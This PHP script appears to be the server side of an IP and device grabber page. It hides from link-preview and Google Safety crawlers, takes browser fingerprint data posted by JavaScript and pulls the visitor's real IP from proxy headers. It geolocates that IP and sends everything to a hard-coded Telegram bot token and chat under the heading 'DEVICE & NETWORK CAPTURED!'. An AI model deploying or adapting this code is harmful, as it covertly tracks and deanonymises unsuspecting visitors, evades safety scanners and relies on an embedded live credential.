<?php

// 1. Anti-Bot / Crawler Protection
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? '';

if (preg_match('/(TelegramBot|WhatsApp|Instagram|facebookexternalhit|Facebot|GoogleImageProxy|Googlebot|Google-Safety|Mediapartners-Google)/i', $userAgent)) { 
    exit(); // Stop immediately. Show them nothing.
}

// 2. Configuration
$botToken = "8386009786:AAE9SInLbXAHOI5HDwm9ctMhDicP7yYmUUM"; 
$chatId = "-1003598938463";     

// 3. Receive Data from Javascript (Safely)
$os = $_POST['Os'] ?? 'Unknown';
$ptf = $_POST['Ptf'] ?? 'Unknown';
$brw = $_POST['Brw'] ?? 'Unknown';
$cc = $_POST['Cc'] ?? 'Unknown';
$ram = $_POST['Ram'] ?? 'Unknown';
$ven = $_POST['Ven'] ?? 'Unknown'; 
$ren = $_POST['Ren'] ?? 'Unknown'; 
$ht = $_POST['Ht'] ?? 'Unknown';
$wd = $_POST['Wd'] ?? 'Unknown';
$bat = $_POST['Bat'] ?? "Unknown";

// 4. Advanced IP Extraction
function getRealIpAddr() {
    $headers = [
        'HTTP_CF_CONNECTING_IP', 'HTTP_TRUE_CLIENT_IP', 'HTTP_INCAP_CLIENT_IP',
        'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_X_REAL_IP', 'HTTP_CLIENT_IP',
        'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED', 'REMOTE_ADDR'
    ];

    foreach ($headers as $header) {
        if (!empty($_SERVER[$header])) {
            foreach (explode(',', $_SERVER[$header]) as $ip) {
                $ip = trim($ip);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false) {
                    return $ip;
                }
            }
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
}

$ip = getRealIpAddr();

// 5. IP Intelligence Lookup (Upgraded to cURL)
$city = "Unknown";
$region = "Unknown";
$country = "Unknown";
$isp = "Unknown";

if ($ip !== 'Unknown') {
    // cURL is much safer and more reliable than file_get_contents for external APIs
    $ch = curl_init("http://ip-api.com/json/{$ip}");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_TIMEOUT, 3); // 3-second timeout prevents server hangs
    $json = curl_exec($ch);
    curl_close($ch);

    if ($json) {
        $details = json_decode($json);
        $city = $details->city ?? "Unknown";
        $region = $details->regionName ?? "Unknown";
        $country = $details->country ?? "Unknown";
        $isp = $details->isp ?? "Unknown";
    }
}

// 6. Format Message
$message = "<b>📱 DEVICE & NETWORK CAPTURED!</b>\n\n";

$message .= "<b>🌐 NETWORK INTELLIGENCE:</b>\n";
$message .= "├ <b>IP:</b> <code>" . $ip . "</code>\n";
$message .= "├ <b>City:</b> " . $city . "\n";
$message .= "├ <b>Region:</b> " . $region . ", " . $country . "\n";
$message .= "└ <b>ISP:</b> " . $isp . "\n\n";

$message .= "<b>💻 DEVICE FINGERPRINT:</b>\n";
$message .= "├ <b>OS:</b> " . $os . " (" . $ptf . ")\n";
$message .= "├ <b>Browser:</b> " . $brw . "\n";
$message .= "├ <b>Battery:</b> " . $bat . "\n"; 
$message .= "├ <b>RAM:</b> " . $ram . " GB\n";
$message .= "├ <b>Screen:</b> " . $wd . "x" . $ht . " px\n";
$message .= "├ <b>Cores:</b> " . $cc . "\n";
$message .= "├ <b>GPU Vendor:</b> " . $ven . "\n";
$message .= "└ <b>GPU Renderer:</b> " . $ren . "\n";

// 7. Send to Telegram
$website = "https://api.telegram.org/bot" . $botToken;
$params = [
    'chat_id' => $chatId,
    'text' => $message,
    'parse_mode' => 'HTML'
];

$ch = curl_init($website . '/sendMessage');
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
curl_exec($ch);
curl_close($ch);

?>
